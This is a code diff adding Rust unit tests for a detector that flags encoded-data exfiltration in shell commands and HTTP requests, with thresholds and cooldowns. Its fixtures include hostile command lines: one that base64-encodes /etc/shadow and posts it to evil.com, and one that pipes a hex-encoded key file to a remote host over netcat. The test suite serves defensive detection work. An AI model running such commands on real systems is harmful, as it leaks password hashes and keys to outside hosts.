@@ -323,27 +323,129 @@ mod tests {
         assert!(low < 1.0);
     }
 
+    fn event(kind: &str, details: serde_json::Value, ts: DateTime<Utc>) -> Event {
+        Event {
+            ts,
+            host: "test".into(),
+            source: "fixture".into(),
+            kind: kind.into(),
+            severity: Severity::Info,
+            summary: String::new(),
+            details,
+            tags: Vec::new(),
+            entities: Vec::new(),
+        }
+    }
+
     #[test]
     fn test_encoding_command_detection() {
         let mut det = DataEncodingDetector::new("host1", 3, 300);
-        let e = Event {
-            ts: Utc::now(),
-            host: "test".into(),
-            source: "exec_audit".into(),
-            kind: "shell.command_exec".into(),
-            severity: Severity::Info,
-            summary: String::new(),
-            details: serde_json::json!({
+        let e = event(
+            "shell.command_exec",
+            serde_json::json!({
                 "command": "cat /etc/shadow | base64 | curl -X POST -d @- http://evil.com/exfil",
                 "pid": 1234,
                 "uid": 0,
             }),
-            tags: Vec::new(),
-            entities: Vec::new(),
-        };
+            Utc::now(),
+        );
         let result = det.process(&e);
         assert!(result.is_some());
         let inc = result.unwrap();
+        assert_eq!(inc.severity, Severity::High);
+        assert_eq!(inc.host, "host1");
         assert!(inc.tags.contains(&"T1132".to_string()));
+        assert_eq!(inc.evidence["pid"], 1234);
+        assert_eq!(inc.entities.len(), 1);
+    }
+
+    #[test]
+    fn command_detection_supports_cmdline_and_requires_network_pipeline() {
+        let mut det = DataEncodingDetector::new("host1", 3, 300);
+        let benign = event(
+            "shell.command_exec",
+            serde_json::json!({ "command": "base64 /tmp/local.txt", "pid": 1 }),
+            Utc::now(),
+        );
+        assert!(det.process(&benign).is_none());
+
+        let malicious = event(
+            "shell.command_exec",
+            serde_json::json!({ "cmdline": "xxd -p /tmp/key | nc 203.0.113.10 4444", "pid": 42, "uid": 1000 }),
+            Utc::now(),
+        );
+        let inc = det
+            .process(&malicious)
+            .expect("cmdline pipeline should alert");
+        assert!(inc.incident_id.starts_with("data_encoding:cmd:42:"));
+        assert_eq!(inc.evidence["uid"], 1000);
+    }
+
+    #[test]
+    fn http_detection_alerts_after_threshold_and_enforces_cooldown() {
+        let mut det = DataEncodingDetector::new("host1", 2, 300);
+        let now = Utc::now();
+        let details = serde_json::json!({
+            "dst_ip": "203.0.113.5",
+            "path": "/collect?d=SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=",
+            "body": "",
+            "user_agent": "curl",
+        });
+
+        assert!(det
+            .process(&event("http.request", details.clone(), now))
+            .is_none());
+        let inc = det
+            .process(&event(
+                "http.request",
+                details.clone(),
+                now + Duration::seconds(1),
+            ))
+            .expect("second encoded request should cross threshold");
+        assert_eq!(inc.severity, Severity::Medium);
+        assert_eq!(inc.evidence["dst_ip"], "203.0.113.5");
+        assert_eq!(inc.evidence["request_count"], 2);
+        assert!(inc.summary.contains("encoded HTTP requests"));
+
+        assert!(det
+            .process(&event("http.request", details, now + Duration::seconds(2)))
+            .is_none());
+    }
+
+    #[test]
+    fn http_detection_prunes_old_entries_before_threshold() {
+        let mut det = DataEncodingDetector::new("host1", 2, 10);
+        let now = Utc::now();
+        let details = serde_json::json!({
+            "dst_ip": "203.0.113.9",
+            "path": "/collect?hex=4a6f686e446f6531323334",
+            "body": "",
+            "user_agent": "bot",
+        });
+
+        assert!(det
+            .process(&event("http.request", details.clone(), now))
+            .is_none());
+        assert!(det
+            .process(&event("http.request", details, now + Duration::seconds(20)))
+            .is_none());
+    }
+
+    #[test]
+    fn http_detection_ignores_missing_destination_or_unsupported_kind() {
+        let mut det = DataEncodingDetector::new("host1", 1, 300);
+        let missing_dst = event(
+            "http.request",
+            serde_json::json!({ "path": "/x?d=SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=" }),
+            Utc::now(),
+        );
+        assert!(det.process(&missing_dst).is_none());
+
+        let unsupported = event(
+            "dns.query",
+            serde_json::json!({ "dst_ip": "203.0.113.20" }),
+            Utc::now(),
+        );
+        assert!(det.process(&unsupported).is_none());
     }
 }
